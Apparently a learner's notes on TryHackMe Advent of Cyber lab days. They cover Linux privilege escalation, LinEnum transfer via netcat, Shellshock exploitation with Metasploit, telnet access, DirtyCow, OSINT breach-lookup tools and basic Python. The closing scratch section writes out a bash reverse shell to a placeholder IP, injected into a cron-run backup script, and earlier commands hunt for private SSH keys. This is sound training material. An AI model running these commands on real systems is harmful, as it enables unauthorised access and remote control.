# Days
|[1](#a-christmas-crisis)|[2](#the-elf-strikes-back!)|[3](#christmas-chaos)|[4](#santa's-watching)|[5](#someone-stole-santa's-gift-list!)|
|:-:|:-:|:-:|:-:|:-:|:-:|
|[6](#be-careful-with-what-you-wish-on-a-christmas-night)|[7](#the-grinch-really-did-steal-christmas)|[8](#what's-under-the-christmas-tree?)|[9](#anyone-can-be-santa)|[10](#don't-be-so-selfish)|
|[11](#the-rogue-gnome)|[12](#ready,-set,-elf)|[13](#coal-for-christmas)|[14](#where's-rudolph?)|[15](#there's-a-python-in-my-stocking!)|
|[16](#help!-where-is-santa?)|[17](#reverseelfneering)|[18](#the-bits-of-christmas)|[19](#the-naughty-or-nice-list)|[20](#powershelf-to-the-rescue)|
|[21](#time-for-some-elforensics)|[22](#elf-mceager-becomes-cyberelf)|[23](#thegGrinch-strikes-again!)|[24](#the-trialbBefore-christmas)|

# The Rogue Gnome
## Topic and concepts
Privilege escalation, Directions, Reinforcing the breach, Enumerations with 
nmap, Checklist, SUID, GTFOBins, Enumeration scripts, Covering 
tracks.<br>
* Levels of permissions
* Horizontal privilege escalation
* Vertical privilege escalation
* Instability
* DVWA (Damn Vulnerable Web Application)
* Command injection
* Difference between `/bin/bash` and `/bin/sh`
* LinEnum
* Enumeration possibilities of LinEnum
* Running an enumerating script
## Walkthrough and commands
Make shell interactive:
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Displqy current shell:
```
echo $0
```
Find file containing ssh keys:
```
find / -name id_rsa 2> /dev/null
```
Priv Esc checklist:
```
1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
3. Looking for automated scripts like backup scripts (exploiting crontabs)
4. Credentials (user accounts, application config files..)
5. Mis-configured file and directory permissions
```
Directory with sudoers:
<br>`/etc/sudoer`<br>
Turn the machine into a web server:
```
python3 -m http.server 8080
```
Listen to incoming files:
```
nc -l -p 1337 > LinEnum.sh
```
Send a file to vlnerable instance:
```
nc -w 3 MACHINE_IP 1337 < LinEnum.sh
```
not `-w -3` ! <br>
Add execution permissions on vulnerable instance:
```
chmod +x LinEnum.sh
```
Logs of ssh key:
<br>`/var/log/auth.log`<br>
Logs of system events:
<br>`/var/log/syslog`<br>
Logs for a specific service:
<br>`/var/log/<service/`<br>
## Ressources
[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation): 
Checklist for Linux<br>
[Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys): 
Tips to make a shell more interactive<br>
[GTFOBins](https://gtfobins.github.io/): 
Website listing executables able to bypass local security restrictions in 
misconfigured systems<br>
[LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh): 
Tool enumerating a machine<br>

# Ready, set, elf
## Topic and concepts
Version numbering, CGI, Abuse, `Metasploit`.<br>
* Information disclosure
* URL encoding
* Shellshock attack
* Data required by `Metasploit`
* LHOST
* RHOST(S)
* TARGETURI
* Checking if options are set correctly
* `Meterpreter`
* Finding the version number of a web server
* Finding CVE to create a `Meterpreter`
## Walkthrough
Folder containing CGIs on a webserver:
<br>`/cgi-bin/`<br>
Parse a command on a URL:
```
<URL>?&<command-to-parse>
```
`Windows` command to reveal information about the system:
```
systeminfo
```
Launch `Metasploit`:
```
msfconsole
```
List `Metasploit`'s required settings:
```
options
```
Set value to a `Metasploit` setting:
```
set <OPTION> <VALUE>
```
Set the exploit used on `Metasploit`:
```
use "said-exploit"
```
Run an exploit on `Metasploit`:
```
run
```
Run commands on a host on `Meterpreter`:
```
shell
```
The IP address to set for LHOST:
```
set LHOST "tun0"
```
Get local IP address :
```
ip a show tun0
```
If the exploit can be run yet the last lines states `no session opened`, it 
means the LHOST is wrong, the `nc` command is not properly set or the local 
machine has no tun0.
## Ressources
[Rapid7](http://rapid7.com/): Knowledge base for vulnerabities<br>
[AttackerKB](https://attackerkb.com/): Knowledge base for vulnerabities<br>
[MITRE](https://cve.mitre.org/cve/): Knowledge base for vulnerabities<br>
[Exploit-DB](http://exploit-db.com/): Knowledge base for vulnerabities<br>
[What is URL Encoding?](https://www.techopedia.com/definition/10346/url-encoding): 
URL encoding explanation<br>
[Shellshock In-Depth](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/): 
Shellshock attack explanation<br>
[`Metasploit`: Basics](https://blog.tryhackme.com/metasploit/): TryHackMe's 
explanation of `Metasploit` in-depth<br>

# Coal for Christmas
## Topic and concepts
Port scanning, Initial access, Enumeration, Privilege escalation, .<br>
* `telnet`
## Walkthrough
Connect to a telnet service:
```
telnet MACHINE_IP <PORT_FROM_NMAP_SCAN>
```
`telnet commands`:
```
ls
cat
cd
```
:
```
uname -a
```
:
```
cat /etc/*release
```
:
```
cat /etc/issue
```
Get the new username created:
```

```
Switch user accounts:
```
su <user_to_change_to>
```
Unknown command:
```
tree | md5sum
```
Simple IP scan:
```
nmap MACHINE_IP
```
## Useful information
`telnet` is a deprecated protocol. <br>
The right DirtyCow exploit is `Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 
'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)`. <br>
## Ressources
None.

# Where's Rudolph?
## Topic and concepts
OSINT investigations.<br>
* User's posting history
* Search engine
* Reverse image searching
* Image EXIF data
* Breached data
## Ressources
[Namechk](https://namechk.com/): User accounts search engine #1<br>
[WhatsLyName Web](https://whatsmyname.app/): User accounts search engine #2<br>
[NameCheckup](https://namecheckup.com/): User accounts search engine #3<br>
[WhatsMyName github](https://github.com/WebBreacher/WhatsMyName): User accounts 
search cli #1<br>
[sherlock](https://github.com/sherlock-project/sherlock): User accounts search 
cli #2<br>
[Google Images](https://images.google.com/): Reverse image search engine #1<br>
[Yandex.Images](https://yandex.com/images/): Reverse image search engine #2<br>
[TinEye Reverse Image Search](https://tineye.com/): Reverse image search engine 
#3<br>
[Bing Visual Search](https://www.bing.com/visualsearch?FORM=ILPVIS): Reverse 
image search engine #4<br>
[Have I Been Pwned](https://haveibeenpwned.com/): Website identifying breached 
accounts<br>
[Scylla](http://scylla.sh/): Password information website<br>
[scylla](https://github.com/k0fin/scylla): Command-line tool for querying 
scylla.sh<br>
[h8mail](https://github.com/khast3x/h8mail): Email OSINT and password breach 
hunting tool<br>
[Dehashed](): Premium password information website<br>

# There's a Python in my stocking!
## Topic and concepts
Python, Instaling and tooling, Hello world !, print(), "Hello, World!", 
Variables, Operators, Boolean, If statements, One line if statements, Loops, 
Libraries.<br>
* `python 3`
* `requests` library
* `beautifulsoup` library
* Pypi libraries database
## Walkthrough
Access the interactive editor for Python:
```
python3
```
Print on stdin:
```
print("Hello, World!")
```
Declare function:
```
def fct():
	print("Hello, World!")
```
String concatenation:
```
"Hello" + ", World!"
```
If statement:
```
if <smth>: <do-smth>
```
Install Python library:
```
pip install <x>
```
## Ressources
[Python Zero to Hero](https://polymath.cloud/python/): Python material #1<br>
[Automate The Boring Stuff with Python](https://automatetheboringstuff.com/): 
Python material #2<br>


9
ftp MACHINE_IP
cd public
get backup.sh backup.sh
vi backup.sh
bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1
nc -lvnp 4444
put backup.sh backup.sh
cat /root/flag.txt

solved by not renaming it script, removing script.sh and then waiting

10
./enum4linux.pl -U
./enum4linux.pl -S
smbclient

11
	ssh cmnatic@
	cat /root/flag.txt

12
	MACHINE_IP
	db : version number, meterpreter

	msfconsole
	options
	set RHOST
	set LHOST
	set TARGETURI
	run
	shell

IP address : 10.8.130.100